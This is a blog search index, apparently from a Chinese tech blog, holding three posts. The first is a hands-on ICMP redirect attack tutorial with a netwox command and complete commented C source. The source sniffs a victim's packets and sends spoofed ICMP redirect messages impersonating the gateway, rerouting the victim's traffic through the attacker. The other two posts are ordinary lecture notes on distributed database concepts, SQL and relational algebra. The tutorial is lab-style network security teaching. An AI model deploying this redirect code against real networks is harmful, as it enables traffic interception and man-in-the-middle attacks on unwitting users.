<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[信息安全实战——重定向攻击]]></title>
    <url>%2F2019%2F04%2F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E6%88%98%E2%80%94ICMP%E9%87%8D%E5%AE%9A%E5%90%91%E6%94%BB%E5%87%BB%2F</url>
    <content type="text"><![CDATA[说明： 攻击者主机 192.168.18.43 受害者主机 192.168.18.44 网关 192.168.18.254 一、Netwox命令实现重定向 1、查看主机ICMP重定向是否开启 2、开启ICMP重定向 3、目前在受害者主机上ping网址正常 4、netwox 86 -f “host 192.168.18.44” -g 192.168.18.43 -i 192.168.18.254 命令执行后 ping包重定向 5、抓包 二、安装pcap 1、安装系统依赖包 apt-get install gcc libc6-dev apt-get install m4 apt-get install flex bison 2、下载libpcap源码包 http://www.tcpdump.org/ 3、将libpcap源码包存放并解压到指定位置 tar -xf libpcap-1.9.0.tar.gz -C /usr/local/lib/libpcap/ 4、编译安装 ./configure make &amp;&amp; make install 5、可能需要在/etc/ld.so.conf 添加两行配置 改成如下 include /etc/ld.so.conf.d/*.conf include /usr/local/lib include /usr/lib 三、ICMP重定向攻击源代码及分析 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370#include &lt;pcap.h&gt;#include &lt;time.h&gt;#include &lt;stdlib.h&gt;#include &lt;memory.h&gt;#include &lt;stdio.h&gt;#include &lt;netinet/in.h&gt;#include &lt;netinet/ip.h&gt;#include &lt;netinet/ip_icmp.h&gt;#include&lt;sys/socket.h&gt;#include&lt;unistd.h&gt;#include &lt;arpa/inet.h&gt;#include &lt;assert.h&gt; #define DATA_LEN 8 #define SIZE_ETHERNET 14#define HEAD_MAX 64 uint32_t Vic_IP; //被攻击者IPuint32_t Ori_Gw_IP; //网关IPuint32_t Redic_IP; //攻击者IPuint16_t ip_id=0; //参考 https://blog.csdn.net/wangzhen_csdn/article/details/80461269//计算校验和static uint16_t checksum(void *buf,int len)&#123; uint32_t sum=0; uint16_t *cbuf=buf; while(len&gt;1) &#123; sum+=*cbuf++; len-=2; &#125; if(len) sum+=*(u_int8_t *)cbuf; sum=(sum&gt;&gt;16)+(sum &amp; 0xffff); sum+=(sum&gt;&gt;16); return ~sum;&#125; void getPacket(u_char * arg, const struct pcap_pkthdr * pkthdr, const u_char * packet)&#123; int sockfd,res; int one = 1; int *ptr_one = &amp;one; //1:AF_INET参数 表示用于处理ip层的数据 2:SOCK_RAW 指定用原始套接字编程 3:指定icmp报文 //如果 socket没有创建成功 会返回负值 if((sockfd = socket(AF_INET,SOCK_RAW,IPPROTO_ICMP))&lt;0) &#123; printf("create sockfd error\n"); exit(-1); &#125; //参数1：sockfd 要被设置或者获取选项的套接字 2:IP选项 //3：IP_HDRINCL 如果没有开启IP_HDRINCL选项，那么内核会帮忙处理IP头部。如果设置了IP_HDRINCL选项，那么用户需要自己生成IP头部的数据 //4:ptr_one 作为选项值的缓冲 //5: 选项值的长度 res = setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL,ptr_one, sizeof(one)); if(res &lt; 0) &#123; printf("error--\n"); exit(-3); &#125; struct iphdr*ipd=(struct iphdr*)(packet+SIZE_ETHERNET); uint8_t re_size=(ipd-&gt;ihl&lt;&lt;2)+DATA_LEN; //获取首部长度5 左移两位 re_size 28 bytes uint8_t all_size=sizeof(struct iphdr)+sizeof(struct icmphdr)+re_size; &#123; struct&#123; struct iphdr ip; struct icmphdr icmp; uint8_t data[HEAD_MAX+DATA_LEN]; &#125;packet=&#123; .ip=&#123; .version = 4, .ihl = 5, //首部长度 .id=ip_id++, .tos = 0, .tot_len = htons(all_size), //host to network long 网络字节序 .frag_off = 0, .ttl = 255, .check = 0, .protocol = IPPROTO_ICMP, .saddr = Ori_Gw_IP, .daddr = Vic_IP &#125;, .icmp=&#123; .type = ICMP_REDIRECT, .code = ICMP_REDIR_HOST, .checksum = 0, .un=&#123; .gateway=Redic_IP &#125; &#125; &#125;; memcpy(packet.data,ipd,re_size); //memcpy 把构造的ip数据报放到packet.data中 packet.ip.check = checksum(&amp;packet.ip, sizeof(packet.ip)); packet.icmp.checksum = checksum(&amp;packet.icmp, sizeof(packet.icmp)+re_size); struct sockaddr_in dest=&#123; .sin_family=AF_INET, .sin_addr=&#123; .s_addr=(Vic_IP) &#125; &#125;; sendto(sockfd,&amp;packet,all_size,0,(struct sockaddr *)&amp;dest,sizeof(dest)); &#125;&#125; void run(char *cmd,char *out)&#123; //popen 创建出一个管道，然后执行CMD命令，返回值为FILE* 指针类型，由于管道数据流是单向的，command只能产生stdout或者读取stdin // 参数'r' 表示CMD从管道中读取数据流，而w表示command的stdout输出到管道中 FILE *fp=popen(cmd,"r"); //fscanf 是用于格式化输入到out中 fscanf(fp,"%s",out); pclose(fp);&#125; int main(int argv,char *args[])&#123; assert(argv==2); //asert 作用是判断条件argv==2 是否为真，如果为假 打印出错信息 因为在linux上运行shi ./filename ip_addr 判断 argv==2 Vic_IP=inet_addr(args[1]); // 执行文件的时候传入 受害者IP地址 char errBuf[PCAP_ERRBUF_SIZE], * devStr; char ip[16]; char buf[1024]; /* get a device */ //获取网络接口设备名,成功就返回设备名指针，失败的话返回NULL，同时,errbuf存放出错误信息字符串 devStr = pcap_lookupdev(errBuf); if(devStr) &#123; printf("success: device: %s\n", devStr); &#125; else &#123; printf("error: %s\n", errBuf); exit(1); &#125; //ifconfig eth0 | awk '$1 ~/inet$/ &#123;print $2&#125;' | awk -F: '&#123;print $2&#125;' //上面是一条Linux命令，用于截取ifconfig eth0 的IP地址 格式化输出到buf中 sprintf(buf,"ifconfig %s|awk '$1 ~ /inet$/ &#123;print $2&#125;'|awk -F: '&#123;print $2&#125;'",devStr); //run函数用于解析出 攻击者的IP 保存到char ip[16]; run(buf,ip); Redic_IP=inet_addr(ip); //打印攻击者的IP printf("get ip %s\n",ip); //route|awk '$1 ~ /default/ &#123;print $2&#125;' //上面是一条Linux命令，用于截取eth0的网关地址 格式化输出到buf中 sprintf(buf,"route|awk '$1 ~ /default/ &#123;print $2&#125;'"); //同理 run函数用于解析出攻击者的网关 保存到char ip[16]中 run(buf,ip); Ori_Gw_IP=inet_addr(ip); printf("get gateway %s\n",ip); /* open a device, wait until a packet arrives */ //根据上一步获得的网络接口设备名 打开网络接口 参数1:网络接口的名字 2：捕获数据包的长度 3:开启混杂模式 4:指定等待毫秒数 0表示一直等待 直到有数据报 5:存储错误信息 pcap_t * device = pcap_open_live(devStr, 65535, 1, 0, errBuf); //设置过滤条件 struct bpf_program filter; char filterstr[50]=&#123;0&#125;; //src host 指定只接受源IP是 被攻击者IP的地址 sprintf(filterstr,"src host %s",args[1]); //参数1： 上一步获得的设备接口指针 2、应用过滤条件 3、之前设置的过滤条件：即只接受源IP是被攻击者的IP地址 //4: 表示是否需要优化过滤表达式 1表示优化 5：mask 指定本地网络的网络掩码，不需要时写0 pcap_compile(device,&amp;filter,filterstr,1,0); //应用过滤规则 pcap_setfilter(device,&amp;filter); //参数：1：上一步获得的设备接口指针 2:指定捕获数据包的个数，一旦抓到了 cnt 个数据包，pcap_loop 立即返回。如果是 -1，就会永无休止的捕获，直到出现错误。 //3:getPacket 回调函数，名字任意，根据需要自行起名。 4: 向回调函数中传递的参数 一般设置为NULL pcap_loop(device, -1, getPacket, NULL); return 0;&#125;]]></content>
      <categories>
        <category>信息安全</category>
      </categories>
      <tags>
        <tag>计算机网络</tag>
        <tag>ICMP</tag>
        <tag>信息安全</tag>
        <tag>网络安全</tag>
        <tag>ip</tag>
        <tag>重定向</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[分布式数据库——第二章 数据与数据模型]]></title>
    <url>%2F2019%2F03%2F%E5%88%86%E5%B8%83%E5%BC%8F%E6%95%B0%E6%8D%AE%E5%BA%93%E2%80%94%E2%80%94%E7%AC%AC%E4%BA%8C%E7%AB%A0%EF%BC%9A%E6%95%B0%E6%8D%AE%E4%B8%8E%E6%95%B0%E6%8D%AE%E6%A8%A1%E5%9E%8B%2F</url>
    <content type="text"><![CDATA[1.数据与数据模型 •数据 – 给定事实 •数据模型 – 抽象的, 自含的, 对象和操作符等的逻辑定义, 所有这些一起组成了抽象机 •实现 – 真实机器上的物理实现 •数据抽象 –实体与联系 实体（Entities） supplier, part, project, warehouse, employee …. 联系（Relationships） sp, sj, spj……. –特征 (Properties) 供应商 : location…. 零件 : weight ….. 2.数据独立 •数据库技术的主要目标 •适应应用需求，数据物理表示和访问技术的改变是必要的 •两类独立性 物理数据独立 当数据库的内部存储结构发生改变时，只要修改模式/内模式映象，可保持概念模式不变，从而保持外模式以及用户程序的不变，保证了数据与程序的物理独立性——数据的物理独立性 逻辑数据独立 当概念模式发生改变时，只要修改外模式/模式映象，可保持外模式不变，从而保持用户应用程序不变，保证了数据与用户程序的逻辑独立性——数据的逻辑独立性 3.体系结构 •三层体系结构 •外模式 单个用户所看到的局部数据的逻辑结构和特征的描述 建立在概念模式之上，同一概念模式上可有多个不同的外模式 通过外模式DDL进行定义 •概念模式 数据库中全体数据的逻辑结构和特征的描述 一个数据库只有一个概念模式 通过模式DDL进行定义 •内模式 数据物理结构和存储方式的描述 一个数据库只有一个内模式 通过内模式DDL定义 4.关系模型 •术语 域 （Domain） 一组具有相同数据类型的值的集合。每个属性有一个域 属性 （Attribute） 二维表格的每一列 元组 （Tuple） 每一行称为关系的一个元组 基数 （Cardinality） 元组的数目 度 （Degree） 列的数目 •性质 一个关系是一个规范化的二维表格 属性值不可分解 不允许表中有表 元组不可重复 因此一个关系模式至少存在一个候选码 没有行序，即元组之间无序 关系是元组的集合，集合的元素是无序的 没有列序，即属性之间无序 关系模式是属性的集合 •操作 选择 （select） 从表中抽取指定的行 投影 （ Project） 从表中抽取指定的列 连接 （Join） 在公共列的基础上连接两个表 以集合为单元操作 算子和结果都是表 闭包性质 一个操作的的输出结果可以是另一个操作的输入 •Key 候选键（Candidate Keys） 当且仅当如下条件成立K 是关系R候选键 唯一性（Uniqueness） 最小性（Irreducibility） e.g. S(s#) 是键, S(s#, age) 是超键（ super key ） 主关键字(Primary Keys)与候选键 Primary key 是被关系选中的候选键 主关键字不能取空值（not null） 外关键字（Foreign Key） – R2 是一关系, R2 中的外关键字是R2的一组属性, FK, 满足: 存在关系R1 有候选键 CK R2 中的每个FK 值一定与 R1中某个元组的CK值相等. 引用完整性 数据库不能含有任何不匹配的外关键字 ON DELETE CASCADE/RESTRICT/NO ACTION ON UPDATE CASCADE/RESTRICT/NO ACTION 解释：引用关系做删除和更新操作的影响：CASCADE跟随一起变化，RESTRICT受限，不允许删除和更新，NO ACTION 不变化——引用完整性受到影响。 •语言 （SQL，代数） DDL 数据库定义语言 创建create – Table – View – Index 例： 创建表： Create Table DEPT ( DEPT# Number, DNAME Char(5), Budget Number( 7,2)); 创建索引： Create index I1 on EMP (E#); Create index I2 on EMP (Ename); 创建唯一性索引： Create unique index I1 on EMP (E#); 创建聚集索引（ 元组按照索引值顺序，物理上尽可能的存储在一起 ,在索引值上执行扫描（scan）操作时可以减少 I/O.）： Create cluster index CI1 on EMP (E#); 含有完整性定义得关系定义例子： Create Table SP ( s# s# not null, p# p# not null, qty qty not null, primary key (s#, p#), foreign key (s#) references S on delete cascade on update cascade, foreign key (p#) references P on delete cascade on update cascade, check (qty &gt;0 and qty &lt;5001) ); DML数据库操纵语言 查询select 例： 查询年龄40岁以下不同部门平均工资大于6000的部门，并按部门降序列表。 select d#, avg (SAL) from EMP where age &lt; 40 group by d# having avg (SAL) &gt; 6000 order by d# desc； 查询在sale部门工作的职工名。 select distinct Ename from EMP where d# in (select d# from DEPT where Dname=‘sale’) 查询缺少某门课成绩的学生学号。 Select s# From SC Where score IS NULL 查询只选修了1门或2门课程的学生学号、姓名和课程数。 Select student.s#, sname, count_c# From (Select s# as s#, count(s#) as count_c# From sc Group by s#) SC2, student Where sc2.s# = student.s# and (count_c#=1 OR count_c#=2) 删除delete 例： 删除所有低于平均工资的职工 。 delete from EMP where SAL &lt; (select avg (SAL) from EMP) 插入insert 例： insert into S (status, city, s#, sname) values (20, ‘shanghai’, ‘s6’, ‘wang ping’ )； 对所有在黄山路 支行的贷款者$200 存款的礼物。 insert into account select loan-number, branch-name, 200 from loan where branch-name = ‘huangshanlu’ 更新update 例： 工资大于 $4,000 的增加 6%, 其他职工工资增加 5%. 嵌入SQL 单元组查询 EXEC SQL Select Ename INTO :ename From EMP Where e# = ‘e1’ 查询供应了amount 数量零件的供应商名字和其所在的城市，先定义游标（ cursor） EXEC SQL declare c cursor for select sname, city from S, SP where S.s# = SP.s# and SP.QTY &gt; :amount 游标打开语句（ open ），执行游标查询 EXEC SQL open c 游标取语句（fetch ）获取一个元组送入主变量 EXEC SQL fetch c into :cn, :cc 通过循环调用fetch语句，获取所有元组 游标关闭语句（ close ） EXEC SQL close c 游标更新定义 declare c cursor for select * from EMP where city = ‘Parise’ for update 修改当前游标元组 update EMP set SAL = SAL + 100 where current of c 关系代数 关系代数的符号 关系代数表达式 并 R∪S＝｛t∣t∈R∨t∈S｝ –t是元组变量 –R和S是关系代数表达式 –R与S的degree必须相同 –R与S的属性类型必须相同 交 R∩S＝｛t∣t∈R∧t∈S｝ 差 积 选择 –水平划分关系 –F是一个逻辑表达式，表示所选的元组应满足的条件 –F由逻辑运算符┐(NOT)、∧(AND)、∨(OR)连接算术表达式构成 •算术表达式形为XθY，θ可以是&gt;,&lt;,=, ≤,≥或≠，X和Y可以是属性名、常量或简单函数 投影 自然联接 设R的属性集为{X,Y}，S的属性集为{Y,Z} R∞S=t|t=&lt;X,Y,Z&gt;∧t[X,Y]∈R∧t[Y,Z]∈S} –相当于在R×S中选取R和S的所有公共属性值都相等的元组，并在结果中去掉重复属性 θ联接 等值联接 在θ联接中，当θ为等号时，称为“等值联接” 等值联接是θ联接中比较常见的形式 关系代数封闭性 任意关系代数操作的结果仍是一个关系 关系代数的封闭性保证了关系代数操作的可嵌套性 关系代数-删除 例：“从数据库中删除姓名为‘Rose’的学生” Student←Student－σname=‘Rose’(Student) 关系代数-插入 例：插入一个新的学生 S1←S1∪ { (‘001’,’Rose’,19) } 关系代数-修改 例：“将所有男学生的学号前加上字母M” Student←π‘M’||sno,name, sex, age(σsex=‘M’(Student)) ∪ (Student－σsex=‘M’(Student)) 关系代数-查询 例：查询所有状态大于20的供应商的供应商号 ​ 查询供应了London城市中零件的供应商号 查询状态大于20并且没有零件的城市 关系代数与SQL 例： 供应商关系模式：S (S#, SNAME, STATUS, CITY) 求住在同一个城市里的供应商号码对]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>数据库</tag>
        <tag>分布式</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[分布式数据库——第一章 高级数据库概述]]></title>
    <url>%2F2019%2F03%2F%E5%88%86%E5%B8%83%E5%BC%8F%E6%95%B0%E6%8D%AE%E5%BA%93%E2%80%94%E2%80%94%E7%AC%AC%E4%B8%80%E7%AB%A0%EF%BC%9A%E9%AB%98%E7%BA%A7%E6%95%B0%E6%8D%AE%E5%BA%93%E6%A6%82%E8%BF%B0%2F</url>
    <content type="text"><![CDATA[第一章 高级数据库概述1.数据与存储系统 •存储层次 Register Cache 主存（Main memory） 辅存（Disk） •新型存储体系 2.数据库系统发展 •数据模型 数据结构, 操作 层次, 网状, 关系, OO, 时态, 空间, 图, 时空, 文本, 工程, 生物, 地理, 图像数据库等 •运行环境 集中式, 分布式, 并行,移动, Cluster, Web, 嵌入，云等 •计算方式 被动/主动, 实时数据库 批处理/流处理等 •数据库（DB） 可以存储长时间的信息集合 •数据库管理系统（DBMS） 允许用户使用专门的数据定义语言和操作语言, 支持大数据量数据的长时间存储,并能正确控制多个用户对数据有效存取的软件 3.关系模型与面向对象模型 •概念层 ——直接面对用户 语义表达能力强 易于被用户理解 独立于任何DBMS 易于向逻辑模型转换 •逻辑层 ——数据模型 用户通过DBMS看到的现实世界 传统的DBMS模型：层次，网络，关系模型 新型的DBMS模型：O—O模型，对象—关系模型等 •物理层 ——对用户透明 数据的表示（存储格式） 数据的索引 高效的操作实现 一致性维护及故障处理 •为什么需要OODB 一些数据结构复杂，难于用关系模型描述。 •面向对象模型 —— OO模型 基本概念： 对象标识 OID 对象封装 类和类的嵌套 类和类的继承 持久对象概念 数据模型 用对象与类结构以及类间继承与组合关系建立数据间的复杂结构关系 模式上的操作 用对象与类中方法构作模式上的操作，这种操作语义远强于传统数据模型 OODBMS必须满足两个基本条件 支持核心的面向对象数据模型 支持传统数据库系统所具有的数据库特征 •特化、泛化 •概念模型及其描述工具 E/R 模型：实体—联系模型 –用实体描述对象属性 –用联系描述对象间的语义关系 基于UML的面向对象的模型 （Unified Modeling Language） –静态对象模型 描述对象的属性，关联，聚合，继承，等等 –动态对象模型 描述对象行为，相互作用，合作和变化，等等 –支持概念模型与逻辑模型无缝联接 基于XML的对象模型 –易学，易扩充 –易于快速开发软件 –多个工具可以支持结构转换 4.集中式系统与分布式系统 •分布式数据库系统 定义: 物理上分散而逻辑上集中的数据库系统. 特点 物理分布性 数据不在单个Site上, 按全局需求将数据划分成一定的数据子集, 分散存储在各个Site上 逻辑整体性 各个Site上的数据子集, 相互间有严密的约束规则加以限定, 逻辑上是一个整体 站点自治性 各个Site上的数据(即LDB)是由本地的DBMS管理, 具有自治处理能力 •为什么需要分布式系统 分布为并行执行提供了可能性 复制增加了可用性 •分布式数据库分类 同构型(Homogeneous) 各个Site上的DB数据模型相同 进一步可分为 同构同质型 同构异质型 异构型(Heterogeneous) 各个Site上的DB数据模型不同 集中型 DDB的全局控制信息位于一个中心Sie上 分散型 每个Site上包含有全局控制信息的一个Copy 可变型 DDB分成两组, 一组Site包含全局控制信息Copy(主Site), 另一组不含全局Copy(辅Site)]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>数据库</tag>
        <tag>分布式</tag>
      </tags>
  </entry>
</search>
